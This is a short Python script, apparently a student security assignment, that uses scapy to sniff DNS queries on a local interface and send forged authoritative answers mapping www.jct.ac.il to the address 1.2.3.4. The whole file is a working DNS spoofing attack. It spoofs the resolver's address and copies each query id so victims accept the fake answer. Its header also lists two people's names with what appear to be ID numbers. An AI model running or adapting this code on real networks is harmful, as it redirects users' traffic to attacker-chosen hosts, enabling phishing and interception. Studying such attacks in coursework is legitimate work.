# Yedidia Bakuradze - 332461854
# Meir Crombie - 214736688

from scapy.all import IP, UDP, DNS, DNSQR, sniff,DNSRR,send,conf

my_ip = conf.iface.ip
fake = "1.2.3.4"
target = "www.jct.ac.il."
def attack(pkt):
    # if not a dns packet
    if not pkt.haslayer(DNS): return

    # if not a request or its mine
    if pkt[DNS].qr == 1: return
    if pkt[IP].src == my_ip: return

    # if is not jct
    qname = pkt[DNSQR].qname.decode()
    if target not in qname: 
        print(f"Skipping {target}/{qname}")
        return

    res = (
        IP(dst=pkt[IP].src, src=pkt[IP].dst) /
        UDP(dport=pkt[UDP].sport, sport=53) /
        DNS(
            id=pkt[DNS].id,
            qr=1,           
            aa=1,           
            qd=pkt[DNS].qd, 
            an=DNSRR(rrname=qname, ttl=300, rdata=fake)
        )
    )
    send(res, verbose=0)

def main():
    print("Starting DNS Poisning ===>")
    sniff(iface="eth0", filter='udp port 53', prn=attack)

main()